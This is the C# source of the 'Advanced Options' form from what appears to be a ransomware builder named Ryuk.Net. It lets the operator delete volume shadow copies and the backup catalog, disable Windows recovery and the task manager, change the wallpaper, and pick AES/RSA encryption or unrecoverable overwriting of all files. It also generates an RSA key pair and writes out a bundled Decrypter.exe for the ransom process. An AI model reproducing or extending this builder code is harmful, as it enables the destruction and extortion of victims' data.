namespace Ryuk.Net
{
    using CustomWindowsForm;
    using Ryuk.Net.Properties;
    using System;
    using System.ComponentModel;
    using System.Drawing;
    using System.IO;
    using System.Reflection;
    using System.Security.Cryptography;
    using System.Windows.Forms;
    using System.Xml.Serialization;

    public class advancedSettingForm : Form
    {
        private bool mouseDown;
        private Point lastLocation;
        private IContainer components = null;
        private Panel panel1;
        private ButtonZ buttonZ1;
        private CheckBox deleteBackupCatalogCheckbox;
        private CheckBox disableRecoveryModeCheckbox;
        private CheckBox deleteShadowCopiesCheckbox;
        private CheckBox resistAdminCheckbox;
        private Label label1;
        private OpenFileDialog openFileDialog1;
        private Label pathToXmlLabel;
        private Button button2;
        private TextBox textBox1;
        private Label label2;
        private Label label3;
        private TextBox pathToImageText;
        private Button button1;
        private RadioButton radioButton2;
        private RadioButton radioButton1;
        private Label overwriteInfoLabel;
        private CheckBox taskManager;

        public advancedSettingForm()
        {
            this.InitializeComponent();
        }

        private void advancedSettingForm_Load(object sender, EventArgs e)
        {
            this.resistAdminCheckbox.Checked = Settings.Default.checkAdminPrivilage;
            bool encryptOption = Settings.Default.encryptOption;
            string decrypterName = Settings.Default.decrypterName;
            if (decrypterName == "")
            {
                this.textBox1.Enabled = true;
            }
            else
            {
                this.textBox1.Text = decrypterName;
                this.textBox1.Enabled = false;
                this.button2.Text = "Public key selected";
            }
            string str2 = Settings.Default.pathToBase64;
            if (str2 != "")
            {
                this.pathToImageText.Text = str2;
            }
        }

        private void advancedSettingForm_MouseDown(object sender, MouseEventArgs e)
        {
            this.mouseDown = true;
            this.lastLocation = e.Location;
        }

        private void advancedSettingForm_MouseMove(object sender, MouseEventArgs e)
        {
            if (this.mouseDown)
            {
                base.Location = new Point((base.Location.X - this.lastLocation.X) + e.X, (base.Location.Y - this.lastLocation.Y) + e.Y);
                base.Update();
            }
        }

        private void advancedSettingForm_MouseUp(object sender, MouseEventArgs e)
        {
            this.mouseDown = false;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog dialog = new OpenFileDialog {
                FilterIndex = 1
            };
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                string fileName = dialog.FileName;
                string str2 = Path.GetFileName(fileName);
                this.textBox1.Text = str2;
                MessageBox.Show(fileName);
            }
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            try
            {
                OpenFileDialog dialog = new OpenFileDialog {
                    Filter = "Image Files(*.jpg; *.jpeg; *.gif; *.bmp)|*.jpg; *.jpeg; *.gif; *.bmp"
                };
                if (dialog.ShowDialog() == DialogResult.OK)
                {
                    this.pathToImageText.Text = dialog.FileName;
                    string contents = Convert.ToBase64String(File.ReadAllBytes(dialog.FileName));
                    Settings.Default.base64Image = contents;
                    Settings.Default.pathToBase64 = dialog.FileName;
                    File.WriteAllText(folderPath + "/sdf.txt", contents);
                }
            }
            catch (Exception)
            {
                throw new ApplicationException("Failed loading image");
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            string text;
            string str5;
            string str6;
            byte[] decrypter;
            RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800);
            string keyString = GetKeyString(provider.ExportParameters(false));
            string contents = GetKeyString(provider.ExportParameters(true));
            string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
            if (this.textBox1.Text.Contains("-decrypter"))
            {
                text = this.textBox1.Text;
                if (text == "")
                {
                    MessageBox.Show("Decrypter name field is empty!");
                }
                else if (Directory.Exists(text))
                {
                    str5 = directoryName + @"\" + text + @"\publicKey.chaos";
                    Settings.Default.publicKey = File.ReadAllText(str5);
                    Settings.Default.decrypterName = text;
                    MessageBox.Show("Public key selected successfully!");
                    this.textBox1.Text = text;
                    this.textBox1.Enabled = false;
                    this.button2.Text = "Public key selected";
                }
                else
                {
                    try
                    {
                        Directory.CreateDirectory(text);
                        str5 = directoryName + @"\" + text + @"\publicKey.chaos";
                        str6 = directoryName + @"\" + text + @"\privateKey.chaos";
                        File.WriteAllText(str5, keyString);
                        File.WriteAllText(str6, contents);
                        decrypter = Resources.decrypter;
                        File.WriteAllBytes(directoryName + @"\" + text + @"\Decrypter.exe", decrypter);
                        Settings.Default.publicKey = File.ReadAllText(str5);
                        Settings.Default.decrypterName = text;
                        MessageBox.Show("Decrypter created and public key selected successfully. Don't delete or move private key! Without private key files cannot be returned");
                        this.textBox1.Text = text;
                        this.textBox1.Enabled = false;
                        this.button2.Text = "Public key selected";
                    }
                    catch
                    {
                        MessageBox.Show("Unexpected error occured");
                    }
                }
            }
            else
            {
                text = this.textBox1.Text + "-decrypter";
                if (text == "-decrypter")
                {
                    MessageBox.Show("Decrypter name field is empty!");
                }
                else if (Directory.Exists(text) || Directory.Exists(text + "-decrypter"))
                {
                    str5 = directoryName + @"\" + text + @"\publicKey.chaos";
                    Settings.Default.publicKey = File.ReadAllText(str5);
                    Settings.Default.decrypterName = text;
                    MessageBox.Show("Decrypter exists. Public key selected successfully!");
                    this.textBox1.Text = text;
                    this.textBox1.Enabled = false;
                    this.button2.Text = "Public key selected";
                }
                else
                {
                    try
                    {
                        Directory.CreateDirectory(text);
                        str5 = directoryName + @"\" + text + @"\publicKey.chaos";
                        str6 = directoryName + @"\" + text + @"\privateKey.chaos";
                        File.WriteAllText(str5, keyString);
                        File.WriteAllText(str6, contents);
                        decrypter = Resources.decrypter;
                        File.WriteAllBytes(directoryName + @"\" + text + @"\Decrypter.exe", decrypter);
                        Settings.Default.publicKey = File.ReadAllText(str5);
                        Settings.Default.decrypterName = text;
                        MessageBox.Show("Decrypter created and public key selected successfully. Don't delete or move private key! Without private key files cannot be returned");
                        this.textBox1.Text = text;
                        this.textBox1.Enabled = false;
                        this.button2.Text = "Public key selected";
                    }
                    catch
                    {
                        MessageBox.Show("Unexpected error occured");
                    }
                }
            }
        }

        private void buttonZ1_Click(object sender, EventArgs e)
        {
            base.Close();
        }

        private void buttonZ1_Click_1(object sender, EventArgs e)
        {
            base.Close();
        }

        private void decrypter(string decrypter)
        {
        }

        private void deleteBackupCatalogCheckbox_CheckedChanged(object sender, EventArgs e)
        {
            Settings.Default.deleteBackupCatalog = this.deleteBackupCatalogCheckbox.Checked;
        }

        private void deleteShadowCopiesCheckbox_CheckedChanged(object sender, EventArgs e)
        {
            Settings.Default.deleteShadowCopies = this.deleteShadowCopiesCheckbox.Checked;
        }

        private void disableRecoveryModeCheckbox_CheckedChanged(object sender, EventArgs e)
        {
            Settings.Default.disableRecoveryMode = this.disableRecoveryModeCheckbox.Checked;
        }

        protected override void Dispose(bool disposing)
        {
            if (!(!disposing || ReferenceEquals(this.components, null)))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        public static string GetKeyString(RSAParameters publicKey)
        {
            StringWriter writer = new StringWriter();
            new XmlSerializer(typeof(RSAParameters)).Serialize((TextWriter) writer, publicKey);
            return writer.ToString();
        }

        private void InitializeComponent()
        {
            this.panel1 = new Panel();
            this.taskManager = new CheckBox();
            this.label3 = new Label();
            this.pathToImageText = new TextBox();
            this.button1 = new Button();
            this.label2 = new Label();
            this.textBox1 = new TextBox();
            this.button2 = new Button();
            this.pathToXmlLabel = new Label();
            this.overwriteInfoLabel = new Label();
            this.radioButton2 = new RadioButton();
            this.radioButton1 = new RadioButton();
            this.label1 = new Label();
            this.buttonZ1 = new ButtonZ();
            this.deleteBackupCatalogCheckbox = new CheckBox();
            this.disableRecoveryModeCheckbox = new CheckBox();
            this.deleteShadowCopiesCheckbox = new CheckBox();
            this.resistAdminCheckbox = new CheckBox();
            this.openFileDialog1 = new OpenFileDialog();
            this.panel1.SuspendLayout();
            base.SuspendLayout();
            this.panel1.BackColor = Color.FromArgb(30, 30, 30);
            this.panel1.Controls.Add(this.taskManager);
            this.panel1.Controls.Add(this.label3);
            this.panel1.Controls.Add(this.pathToImageText);
            this.panel1.Controls.Add(this.button1);
            this.panel1.Controls.Add(this.label2);
            this.panel1.Controls.Add(this.textBox1);
            this.panel1.Controls.Add(this.button2);
            this.panel1.Controls.Add(this.pathToXmlLabel);
            this.panel1.Controls.Add(this.overwriteInfoLabel);
            this.panel1.Controls.Add(this.radioButton2);
            this.panel1.Controls.Add(this.radioButton1);
            this.panel1.Controls.Add(this.label1);
            this.panel1.Controls.Add(this.buttonZ1);
            this.panel1.Controls.Add(this.deleteBackupCatalogCheckbox);
            this.panel1.Controls.Add(this.disableRecoveryModeCheckbox);
            this.panel1.Controls.Add(this.deleteShadowCopiesCheckbox);
            this.panel1.Controls.Add(this.resistAdminCheckbox);
            this.panel1.Location = new Point(2, 1);
            this.panel1.Name = "panel1";
            this.panel1.Size = new Size(0x15d, 0x19f);
            this.panel1.TabIndex = 11;
            this.panel1.Paint += new PaintEventHandler(this.panel1_Paint);
            this.panel1.MouseDown += new MouseEventHandler(this.panel1_MouseDown);
            this.panel1.MouseMove += new MouseEventHandler(this.panel1_MouseMove);
            this.panel1.MouseUp += new MouseEventHandler(this.panel1_MouseUp);
            this.taskManager.AutoSize = true;
            this.taskManager.Cursor = Cursors.Hand;
            this.taskManager.Enabled = false;
            this.taskManager.ForeColor = Color.White;
            this.taskManager.Location = new Point(70, 0xbd);
            this.taskManager.Name = "taskManager";
            this.taskManager.Size = new Size(0x80, 0x11);
            this.taskManager.TabIndex = 0x22;
            this.taskManager.Text = "Disable task manager";
            this.taskManager.UseVisualStyleBackColor = true;
            this.taskManager.CheckedChanged += new EventHandler(this.taskManager_CheckedChanged);
            this.label3.AutoSize = true;
            this.label3.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.label3.ForeColor = Color.White;
            this.label3.Location = new Point(0x13, 0xe3);
            this.label3.Name = "label3";
            this.label3.Size = new Size(0xa9, 0x10);
            this.label3.TabIndex = 0x21;
            this.label3.Text = "Change desktop wallpaper";
            this.pathToImageText.BackColor = Color.FromArgb(30, 30, 30);
            this.pathToImageText.ForeColor = Color.White;
            this.pathToImageText.Location = new Point(0x15, 250);
            this.pathToImageText.Name = "pathToImageText";
            this.pathToImageText.Size = new Size(0xcd, 20);
            this.pathToImageText.TabIndex = 0x20;
            this.button1.BackColor = Color.FromArgb(30, 30, 30);
            this.button1.Cursor = Cursors.Hand;
            this.button1.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.button1.ForeColor = Color.White;
            this.button1.Location = new Point(0xe8, 0xf6);
            this.button1.Name = "button1";
            this.button1.Size = new Size(110, 0x1a);
            this.button1.TabIndex = 0x1f;
            this.button1.Text = "Select Image";
            this.button1.UseVisualStyleBackColor = false;
            this.button1.Click += new EventHandler(this.button1_Click_1);
            this.label2.AutoSize = true;
            this.label2.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.label2.ForeColor = Color.White;
            this.label2.Location = new Point(0x12, 0x165);
            this.label2.Name = "label2";
            this.label2.Size = new Size(0x6b, 0x10);
            this.label2.TabIndex = 30;
            this.label2.Text = "Decrypter Name";
            this.label2.Click += new EventHandler(this.label2_Click);
            this.textBox1.BackColor = Color.FromArgb(30, 30, 30);
            this.textBox1.ForeColor = Color.White;
            this.textBox1.Location = new Point(0x15, 0x178);
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new Size(0x9f, 20);
            this.textBox1.TabIndex = 0x1d;
            this.textBox1.TextChanged += new EventHandler(this.textBox1_TextChanged);
            this.button2.BackColor = Color.FromArgb(30, 30, 30);
            this.button2.Cursor = Cursors.Hand;
            this.button2.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.button2.ForeColor = Color.White;
            this.button2.Location = new Point(0xce, 370);
            this.button2.Name = "button2";
            this.button2.Size = new Size(0x88, 0x1a);
            this.button2.TabIndex = 0x1c;
            this.button2.Text = "Create Decrypter";
            this.button2.UseVisualStyleBackColor = false;
            this.button2.Click += new EventHandler(this.button2_Click);
            this.pathToXmlLabel.AutoSize = true;
            this.pathToXmlLabel.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.pathToXmlLabel.ForeColor = Color.White;
            this.pathToXmlLabel.Location = new Point(0x18, 0x163);
            this.pathToXmlLabel.Name = "pathToXmlLabel";
            this.pathToXmlLabel.Size = new Size(0, 0x10);
            this.pathToXmlLabel.TabIndex = 0x1a;
            this.pathToXmlLabel.Click += new EventHandler(this.pathToXmlLabel_Click);
            this.overwriteInfoLabel.AutoSize = true;
            this.overwriteInfoLabel.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.overwriteInfoLabel.ForeColor = Color.White;
            this.overwriteInfoLabel.Location = new Point(0x16, 0x14b);
            this.overwriteInfoLabel.Name = "overwriteInfoLabel";
            this.overwriteInfoLabel.Size = new Size(0x113, 0x10);
            this.overwriteInfoLabel.TabIndex = 0x18;
            this.overwriteInfoLabel.Text = "Files will be encrypted with AES/RSA method";
            this.overwriteInfoLabel.Click += new EventHandler(this.overwriteInfoLabel_Click);
            this.radioButton2.AutoSize = true;
            this.radioButton2.Checked = true;
            this.radioButton2.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.radioButton2.ForeColor = Color.White;
            this.radioButton2.Location = new Point(0xce, 0x128);
            this.radioButton2.Name = "radioButton2";
            this.radioButton2.Size = new Size(0x8e, 20);
            this.radioButton2.TabIndex = 0x17;
            this.radioButton2.TabStop = true;
            this.radioButton2.Text = "Encrypt  AES / RSA";
            this.radioButton2.UseVisualStyleBackColor = true;
            this.radioButton2.CheckedChanged += new EventHandler(this.radioButton2_CheckedChanged);
            this.radioButton1.AutoSize = true;
            this.radioButton1.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.radioButton1.ForeColor = Color.White;
            this.radioButton1.Location = new Point(30, 0x128);
            this.radioButton1.Name = "radioButton1";
            this.radioButton1.Size = new Size(0x7e, 20);
            this.radioButton1.TabIndex = 0x16;
            this.radioButton1.Text = "Overwrite all files";
            this.radioButton1.UseVisualStyleBackColor = true;
            this.radioButton1.Visible = false;
            this.radioButton1.CheckedChanged += new EventHandler(this.radioButton1_CheckedChanged);
            this.label1.AutoSize = true;
            this.label1.Font = new Font("Microsoft Sans Serif", 20.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
            this.label1.ForeColor = Color.White;
            this.label1.Location = new Point(5, 8);
            this.label1.Name = "label1";
            this.label1.Size = new Size(0xfc, 0x1f);
            this.label1.TabIndex = 0x15;
            this.label1.Text = "Advanced Options";
            this.buttonZ1.Anchor = AnchorStyles.Right | AnchorStyles.Top;
            this.buttonZ1.BZBackColor = Color.FromArgb(30, 30, 30);
            this.buttonZ1.DisplayText = "X";
            this.buttonZ1.FlatStyle = FlatStyle.Flat;
            this.buttonZ1.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, 0);
            this.buttonZ1.ForeColor = Color.White;
            this.buttonZ1.Location = new Point(0x13e, 0);
            this.buttonZ1.MouseClickColor1 = Color.FromArgb(60, 60, 160);
            this.buttonZ1.MouseHoverColor = Color.FromArgb(50, 50, 50);
            this.buttonZ1.Name = "buttonZ1";
            this.buttonZ1.Size = new Size(0x1f, 0x18);
            this.buttonZ1.TabIndex = 20;
            this.buttonZ1.Text = "X";
            this.buttonZ1.TextLocation_X = 6;
            this.buttonZ1.TextLocation_Y = 1;
            this.buttonZ1.UseVisualStyleBackColor = true;
            this.buttonZ1.Click += new EventHandler(this.buttonZ1_Click_1);
            this.deleteBackupCatalogCheckbox.AutoSize = true;
            this.deleteBackupCatalogCheckbox.Cursor = Cursors.Hand;
            this.deleteBackupCatalogCheckbox.Enabled = false;
            this.deleteBackupCatalogCheckbox.ForeColor = Color.White;
            this.deleteBackupCatalogCheckbox.Location = new Point(70, 120);
            this.deleteBackupCatalogCheckbox.Name = "deleteBackupCatalogCheckbox";
            this.deleteBackupCatalogCheckbox.Size = new Size(0x98, 0x11);
            this.deleteBackupCatalogCheckbox.TabIndex = 0x13;
            this.deleteBackupCatalogCheckbox.Text = "Delete the backup catalog";
            this.deleteBackupCatalogCheckbox.UseVisualStyleBackColor = true;
            this.deleteBackupCatalogCheckbox.CheckedChanged += new EventHandler(this.deleteBackupCatalogCheckbox_CheckedChanged);
            this.disableRecoveryModeCheckbox.AutoSize = true;
            this.disableRecoveryModeCheckbox.Cursor = Cursors.Hand;
            this.disableRecoveryModeCheckbox.Enabled = false;
            this.disableRecoveryModeCheckbox.ForeColor = Color.White;
            this.disableRecoveryModeCheckbox.Location = new Point(70, 0x9b);
            this.disableRecoveryModeCheckbox.Name = "disableRecoveryModeCheckbox";
            this.disableRecoveryModeCheckbox.Size = new Size(0xb2, 0x11);
            this.disableRecoveryModeCheckbox.TabIndex = 0x12;
            this.disableRecoveryModeCheckbox.Text = "Disable windows recovery mode";
            this.disableRecoveryModeCheckbox.UseVisualStyleBackColor = true;
            this.disableRecoveryModeCheckbox.CheckedChanged += new EventHandler(this.disableRecoveryModeCheckbox_CheckedChanged);
            this.deleteShadowCopiesCheckbox.AutoSize = true;
            this.deleteShadowCopiesCheckbox.Cursor = Cursors.Hand;
            this.deleteShadowCopiesCheckbox.Enabled = false;
            this.deleteShadowCopiesCheckbox.ForeColor = Color.White;
            this.deleteShadowCopiesCheckbox.Location = new Point(70, 0x54);
            this.deleteShadowCopiesCheckbox.Name = "deleteShadowCopiesCheckbox";
            this.deleteShadowCopiesCheckbox.Size = new Size(190, 0x11);
            this.deleteShadowCopiesCheckbox.TabIndex = 0x11;
            this.deleteShadowCopiesCheckbox.Text = "Delete all Volumes Shadow Copies";
            this.deleteShadowCopiesCheckbox.UseVisualStyleBackColor = true;
            this.deleteShadowCopiesCheckbox.CheckedChanged += new EventHandler(this.deleteShadowCopiesCheckbox_CheckedChanged);
            this.resistAdminCheckbox.AutoSize = true;
            this.resistAdminCheckbox.Cursor = Cursors.Hand;
            this.resistAdminCheckbox.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Bold, GraphicsUnit.Point, 0);
            this.resistAdminCheckbox.ForeColor = Color.White;
            this.resistAdminCheckbox.Location = new Point(0x39, 0x34);
            this.resistAdminCheckbox.Name = "resistAdminCheckbox";
            this.resistAdminCheckbox.Size = new Size(0xd4, 20);
            this.resistAdminCheckbox.TabIndex = 0x10;
            this.resistAdminCheckbox.Text = "Resist for admin privileges";
            this.resistAdminCheckbox.UseVisualStyleBackColor = true;
            this.resistAdminCheckbox.CheckedChanged += new EventHandler(this.resistAdminCheckbox_CheckedChanged);
            this.openFileDialog1.FileName = "openFileDialog1";
            base.AutoScaleDimensions = new SizeF(6f, 13f);
            base.AutoScaleMode = AutoScaleMode.Font;
            this.BackColor = Color.FromArgb(0x19, 0x19, 0x19);
            base.ClientSize = new Size(0x164, 0x1a3);
            base.Controls.Add(this.panel1);
            base.FormBorderStyle = FormBorderStyle.None;
            base.Name = "advancedSettingForm";
            base.ShowInTaskbar = false;
            base.StartPosition = FormStartPosition.CenterScreen;
            this.Text = "advancedSettingForm";
            base.Load += new EventHandler(this.advancedSettingForm_Load);
            base.MouseDown += new MouseEventHandler(this.advancedSettingForm_MouseDown);
            base.MouseMove += new MouseEventHandler(this.advancedSettingForm_MouseMove);
            base.MouseUp += new MouseEventHandler(this.advancedSettingForm_MouseUp);
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            base.ResumeLayout(false);
        }

        private void label2_Click(object sender, EventArgs e)
        {
        }

        private void overwriteInfoLabel_Click(object sender, EventArgs e)
        {
        }

        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            this.mouseDown = true;
            this.lastLocation = e.Location;
        }

        private void panel1_MouseMove(object sender, MouseEventArgs e)
        {
            if (this.mouseDown)
            {
                base.Location = new Point((base.Location.X - this.lastLocation.X) + e.X, (base.Location.Y - this.lastLocation.Y) + e.Y);
                base.Update();
            }
        }

        private void panel1_MouseUp(object sender, MouseEventArgs e)
        {
            this.mouseDown = false;
        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {
        }

        private void pathToXmlLabel_Click(object sender, EventArgs e)
        {
        }

        private void radioButton1_CheckedChanged(object sender, EventArgs e)
        {
            this.button2.Visible = false;
            this.textBox1.Visible = false;
            this.label2.Visible = false;
            this.overwriteInfoLabel.Text = "This function works faster but files cannot be returned ";
            Settings.Default.encryptOption = false;
        }

        private void radioButton2_CheckedChanged(object sender, EventArgs e)
        {
            this.button2.Visible = true;
            this.textBox1.Visible = true;
            this.label2.Visible = true;
            this.overwriteInfoLabel.Text = "Files will be encrypted with AES / RSA method ";
            Settings.Default.encryptOption = true;
        }

        private void resistAdminCheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (this.resistAdminCheckbox.Checked)
            {
                Settings.Default.checkAdminPrivilage = true;
                this.deleteShadowCopiesCheckbox.Enabled = true;
                this.disableRecoveryModeCheckbox.Enabled = true;
                this.deleteBackupCatalogCheckbox.Enabled = true;
                this.deleteShadowCopiesCheckbox.Checked = true;
                this.disableRecoveryModeCheckbox.Checked = true;
                this.deleteBackupCatalogCheckbox.Checked = true;
                this.taskManager.Checked = true;
                this.taskManager.Enabled = true;
            }
            else
            {
                Settings.Default.checkAdminPrivilage = false;
                this.deleteShadowCopiesCheckbox.Enabled = false;
                this.disableRecoveryModeCheckbox.Enabled = false;
                this.deleteBackupCatalogCheckbox.Enabled = false;
                this.deleteShadowCopiesCheckbox.Checked = false;
                this.disableRecoveryModeCheckbox.Checked = false;
                this.deleteBackupCatalogCheckbox.Checked = false;
                this.taskManager.Checked = false;
                this.taskManager.Enabled = false;
            }
        }

        private void taskManager_CheckedChanged(object sender, EventArgs e)
        {
            Settings.Default.disableTaskManager = this.taskManager.Checked;
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
        }
    }
}
